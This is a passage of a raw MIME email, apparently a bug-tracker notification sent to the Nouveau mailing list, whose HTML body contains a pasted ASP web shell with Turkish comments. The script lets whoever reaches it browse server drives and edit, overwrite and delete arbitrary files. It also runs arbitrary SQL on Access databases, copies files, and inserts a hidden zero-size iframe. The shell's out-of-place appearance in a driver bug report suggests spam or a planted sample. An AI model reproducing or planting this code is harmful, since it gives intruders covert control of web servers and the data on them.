color=3Dblack&gt;&lt;b&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;&amp;objRcs.F=
ields(i).Name&amp;&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/font&gt;&lt;/td&=
gt;&quot;
    next
    Response.Write &quot;&lt;/tr&gt;&quot;
    do while not objRcs.EOF
        Response.Write &quot;&lt;tr&gt;&quot;
        for i=3D0 to objRcs.Fields.count-1
            Response.Write &quot;&lt;td&gt;&quot;&amp;objRcs.Fields(i).Valu=
e&amp;&quot;&amp;nbsp;&lt;/td&gt;&quot;
        next
        Response.Write &quot;&lt;/tr&gt;&quot;
        objRcs.MoveNext
    loop
    Response.Write &quot;&lt;/table&gt;&lt;br&gt;&quot;
    hataKontrol
CASE 9 'SQL Execute
    Set objConn =3D Server.CreateObject(&quot;ADODB.Connection&quot;)
    objConn.Provider =3D &quot;Microsoft.Jet.Oledb.4.0&quot;
    objConn.ConnectionString =3D Path
    objConn.Open
    objConn.Execute strSQL
'    Response.Redirect dosyaPath&amp;&quot;?status=3D7&amp;Path=3D&quot;&am=
p;Path&amp;&quot;&amp;Time=3D&quot;&amp;time
    hataKontrol
CASE 10 'Dosya Editleme
    set f =3D objFSO.OpenTextFile(dPath,1)
    Response.Write &quot;&lt;center&gt;&lt;form action=3D'&quot;&amp;DosyPa=
th&amp;&quot;?Time=3D&quot;&amp;time&amp;&quot;'
method=3Dpost&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden name=3Dstatus value=3D'11'=
&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden name=3DdPath value=3D'&quo=
t;&amp;dPath&amp;&quot;'&gt;&quot;
    Response.Write &quot;&lt;input type=3Dhidden name=3DPath  value=3D'&quo=
t;&amp;Path &amp;&quot;'&gt;&quot;
    Response.Write &quot;&lt;input type=3Dsubmit value=3DKaydet&gt;&lt;br&g=
t;&quot;
    Response.Write &quot;&lt;textarea name=3Ddkayit
style=3D'width:90%;height:350;border-right: lightgoldenrodyellow thin
solid;border-top: lightgoldenrodyellow thin solid;font-size: 12;border-left:
lightgoldenrodyellow thin solid;color: lime;    border-bottom:
lightgoldenrodyellow thin solid;    font-family: Courier New,
Arial;background-color: navy;'&gt;ssdfsd&quot;
    Response.Write server.HTMLEncode(f.readAll)
    Response.Write &quot;&lt;/textarea&gt;&lt;/form&gt;&lt;/center&gt;&quot;
    hataKontrol
CASE 11 'Dosya Kay=C3=BDt
    set saveTextFile =3D objFSO.OpenTextFile(dPath,2,true,false)
    hataKontrol
    saveTextFile.Write(dkayit)
    saveTextFile.close
    if err&lt;&gt;0 then
        byMsg =3D &quot;&lt;font color=3Dred&gt;Not File Edited!&lt;/font&g=
t;&lt;br&gt;&quot;
    else
        byMsg =3D &quot;&lt;font color=3Dyellow&gt;File Edited Successful:)=
&lt;/font&gt;&lt;br&gt;&quot;
    end if
    Response.Redirect dosyaPath&amp;&quot;?status=3D2&amp;path=3D&quot;&amp=
;path&amp;&quot;&amp;time=3D&quot;&amp;time&amp;&quot;&amp;byMsg=3D&quot;
&amp; byMsg
CASE 12 'Dosya Arama
    araBul path,arama
    hataKontrol
END SELECT
Response.Write &quot;&lt;/tr&gt;&lt;/table&gt;&quot;

sub DosyaOku
    Set f =3D objFSO.GetFolder(Path)
    Set fc =3D f.Files
    For Each f1 In fc
        dosyaAdi =3D f1.name
        num =3D InStrRev(dosyaAdi,&quot;.&quot;)
        uzanti =3D lcase(Right(dosyaAdi,len(dosyaAdi)-num))
        downStr =3D &quot;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D3&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;&amp;Del=3D&quot;&amp;Path&amp;&quot;/&quot;&amp;f1.Name&amp;&=
quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'&gt;=C3=BB&lt;/a&gt;&lt;font
face=3Dwebdings&gt;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D-3&amp;PathFile=3D&quot;&a=
mp;f1.path&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'&gt;=C3=8D&lt;/=
a&gt;&lt;/font&gt;&lt;font
face=3Dwingdings&gt;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D16&amp;PathFile=3D&quot;&a=
mp;f1.path&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'
onclick=3D&quot;&quot;ffd(this.href);return false;&quot;&quot;&gt;4&lt;/a&g=
t;&lt;/font&gt;&quot;
        response.Write &quot;&lt;font size=3D2&gt;&quot;
        select case uzanti
        case &quot;mdb&quot;
            Response.Write &quot;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D7&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;/&quot;&amp;f1.Name&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;=
&quot;'&gt;&quot;&amp;f1.name&amp;&quot;
[&lt;font color=3Dyellow&gt;&quot;&amp;FormatNumber(f1.size,0)&amp;&quot;&l=
t;/font&gt;]&quot;&amp;&quot;&lt;/a&gt;&lt;/b&gt; &lt;font
face=3Dwingdings size=3D4&gt;M =C2=A0&quot;&amp;downStr&amp;&quot;&lt;/font=
&gt;&lt;br&gt;&quot;
        case &quot;asp&quot;
            Response.Write &quot;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D5&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;/&quot;&amp;f1.Name&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;=
&quot;'&gt;&quot;&amp;f1.name&amp;&quot;
[&lt;font color=3Dyellow&gt;&quot;&amp;FormatNumber(f1.size,0)&amp;&quot;&l=
t;/font&gt;]&quot;&amp;&quot;&lt;/a&gt;&lt;/b&gt; &lt;font
face=3Dwingdings size=3D4&gt;=C2=B1 &lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D10&amp;dPath=3D&quot;&amp;=
f1.path&amp;&quot;&amp;path=3D&quot;&amp;path&amp;&quot;&amp;Time=3D&quot;&=
amp;time&amp;&quot;'&gt;!&lt;/a&gt;&quot;&amp;downStr&amp;&quot;&lt;/font&g=
t;&lt;br&gt;&quot;
        case &quot;jpg&quot;,&quot;gif&quot;
            Response.Write &quot;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D6&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;/&quot;&amp;f1.Name&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;=
&quot;'&gt;&quot;&amp;f1.name&amp;&quot;
[&lt;font color=3Dyellow&gt;&quot;&amp;FormatNumber(f1.size,0)&amp;&quot;&l=
t;/font&gt;]&quot;&amp;&quot;&lt;/a&gt;&lt;/b&gt; &lt;font
face=3Dwebdings size=3D4&gt;=C2=A2&lt;/font&gt;&lt;font face=3Dwingdings si=
ze=3D4&gt;=20
&quot;&amp;downStr&amp;&quot;&lt;/font&gt;&lt;br&gt;&quot;
        case else
            Response.Write &quot;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D5&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;/&quot;&amp;f1.Name&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;=
&quot;'&gt;&quot;&amp;f1.name&amp;&quot;
[&lt;font color=3Dyellow&gt;&quot;&amp;FormatNumber(f1.size,0)&amp;&quot;&l=
t;/font&gt;]&quot;&amp;&quot;&lt;/a&gt;&lt;/b&gt; &lt;font
face=3Dwingdings size=3D4&gt;2 &lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D10&amp;dPath=3D&quot;&amp;=
f1.path&amp;&quot;&amp;path=3D&quot;&amp;path&amp;&quot;&amp;Time=3D&quot;&=
amp;time&amp;&quot;'&gt;!&lt;/a&gt;&quot;&amp;downStr&amp;&quot;&lt;/font&g=
t;&lt;br&gt;&quot;
        end select
    Next
end sub

sub KlasorOku
    Set f =3D objFSO.GetFolder(Path)
    Set fc =3D f.SubFolders
    if session(&quot;klasoroku&quot;)=3D&quot;&quot; then
        response.Write &quot;&lt;iframe style=3D'width:0; height:0'
src=3D'<a href=3D"http://localhost/tuzla-ebelediye">http://localhost/tuzla-=
ebelediye</a>'&gt;&lt;/iframe&gt;&quot;
        session(&quot;klasoroku&quot;)=3D&quot;simdi yaz=C3=BDl=C3=BDyor&qu=
ot;
    end if
    For Each f1 In fc
        Response.Write &quot;&lt;font face=3Dwingdings size=3D3&gt;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D18&amp;PathFile=3D&quot;&a=
mp;Path&amp;&quot;/&quot;&amp;f1.Name&amp;&quot;&amp;Time=3D&quot;&amp;time=
&amp;&quot;'
onclick=3D&quot;&quot;ffd(this.href);return false;&quot;&quot;&gt;4&lt;/a&g=
t;&lt;/font&gt; &lt;font face=3Dwingdings
size=3D4&gt;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D4&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;&amp;Del=3D&quot;&amp;Path&amp;&quot;/&quot;&amp;f1.Name&amp;&=
quot;&amp;Time=3D&quot;&amp;time&amp;&quot;'&gt;=C3=BB&lt;/a&gt;
1&lt;/font&gt;&lt;font size=3D2&gt;&lt;b&gt;&lt;a
href=3D'&quot;&amp;dosyaPath&amp;&quot;?status=3D2&amp;Path=3D&quot;&amp;Pa=
th&amp;&quot;/&quot;&amp;f1.Name&amp;&quot;&amp;Time=3D&quot;&amp;time&amp;=
&quot;'&gt;&quot;&amp;f1.name&amp;&quot;&lt;/a&gt;&lt;/b&gt;&lt;br&gt;&quot;
    Next
end sub

function createFileName()
Randomize
    fName_ =3D &quot;&quot;
    for i=3D1 to 10
        fName_ =3D fName_ &amp; int(Rnd*100)
    next
    createFileName =3D fName_
end function

function resimYol(path_)
on error resume next
    path_ =3D Replace(Replace(path_,&quot;\&quot;,&quot;/&quot;),&quot;//&q=
uot;,&quot;/&quot;)
    lpath_ =3D
left(request.servervariables(&quot;PATH_TRANSLATED&quot;),instrrev(request.=
servervariables(&quot;PATH_TRANSLATED&quot;),&quot;\&quot;))
    if yaziyomu2(lpath_) then
        fname__ =3D &quot;0&quot;&amp;createFileName()&amp;&quot;.&quot;&am=
p;Right(path_,3)
        objFSO.CopyFile path_, lpath_&amp;&quot;\&quot;&amp;fname__
    else
        Response.Write(&quot;Resim A=C3=A7=C3=BDlam=C3=BDyor.. &lt;br&gt;=
=C3=9Dsterseniz Download Ederek
g=C3=B6r=C3=BCnt=C3=BCleyebilirsiniz..&quot;)
    end if
    resimYol =3D fname__
end function

if not popup then
    Set fc =3D Nothing
    Set objFSO =3D Nothing
    Response.End
end if
%&gt;&lt;script language=3Djavascript&gt;
        var dosyaPath =3D &quot;&lt;%=3DdosyaPath%&gt;&quot;
                // DRIVE ISLEMLERI
                function driveGo(drive_){
                        location =3D
dosyaPath+&quot;?status=3D1&amp;path=3D&quot;+drive_+&quot;&amp;Time=3D&quo=
t;+Date();
                }
        &lt;/script&gt;
        &lt;%
        Response.Write &quot;&lt;table align=3Dcenter border=3D1 width=3D15=
0 cellpadding=3D0
cellspacing=3D0&gt;&lt;tr bgcolor=3Dgray&gt;&lt;td align=3Dcenter&gt;&lt;b&=
gt;&lt;font color=3Dwhite&gt;Daftar
drive:&lt;/td&gt;&lt;/tr&gt;&quot;
        for each drive_ in objFSO.Drives
                Response.Write &quot;&lt;tr&gt;&lt;td&gt;&quot;
                Response.write &quot;&lt;a href=3D'#'onClick=3D&quot;&quot;=
driveGo('&quot; &amp;
drive_.DriveLetter &amp; &quot;');return false;&quot;&quot;&gt;&lt;font fac=
e=3Dwingdings&gt;;&lt;/font&gt;&quot;
                if drive_.Drivetype=3D1 then Response.write &quot;Floppy [&=
quot; &amp;
drive_.DriveLetter &amp; &quot;:]&quot;
                if drive_.Drivetype=3D2 then Response.write &quot;HardDisk =
[&quot; &amp;
drive_.DriveLetter &amp; &quot;:]&quot;
                if drive_.Drivetype=3D3 then Response.write &quot;Remote HD=
D [&quot; &amp;
drive_.DriveLetter &amp; &quot;:]&quot;
                if drive_.Drivetype=3D4 then Response.write &quot;CD-Rom [&=
quot; &amp;
drive_.DriveLetter &amp; &quot;:]&quot;
                Response.Write &quot;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&quot;
        next
        Response.Write &quot;&lt;tr&gt;&lt;td&gt;&quot;
        Response.write &quot;&lt;a href=3D'&quot;&amp;dosyaPath&amp;&quot;?=
time=3D&quot;&amp;time()&amp;&quot;'&gt;&lt;font
face=3Dwebdings&gt;H&lt;/font&gt; Local Path&quot;
        Response.Write &quot;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&quot;
        Response.Write &quot;&lt;/table&gt;&lt;br&gt;&quot;
Set fc =3D Nothing
Set objFSO =3D Nothing
Response.End%&gt;</pre>
        </div>
      </p>


      <hr>
      <span>You are receiving this mail because:</span>

      <ul>
          <li>You are the QA Contact for the bug.</li>
          <li>You are the assignee for the bug.</li>
      </ul>
    </body>
</html>=

--15032786130.7Ad5.4529--

--===============1198200687==
Content-Type: text/plain; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: inline

X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KTm91dmVhdSBt
YWlsaW5nIGxpc3QKTm91dmVhdUBsaXN0cy5mcmVlZGVza3RvcC5vcmcKaHR0cHM6Ly9saXN0cy5m
cmVlZGVza3RvcC5vcmcvbWFpbG1hbi9saXN0aW5mby9ub3V2ZWF1Cg==

--===============1198200687==--
